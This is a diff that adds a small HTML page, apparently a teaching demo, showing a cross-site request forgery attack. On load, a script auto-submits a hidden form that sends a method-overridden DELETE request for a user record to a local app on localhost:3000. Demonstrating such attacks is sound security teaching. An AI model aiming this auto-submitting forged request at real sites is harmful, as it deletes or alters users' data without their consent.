@@ -1,0 +1,14 @@
+<!-- public/csrf-attack.html -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><meta charset="UTF-8"><title>CSRF Demo</title></head>
+<body>
+  <h1>Carregue esta página para deletar sem querer!</h1>
+  <form id="csrfForm" action="http://localhost:3000/users/681800a8658cebcf6cf3a9d8" method="POST">
+    <input type="hidden" name="_method" value="DELETE">
+  </form>
+  <script>
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
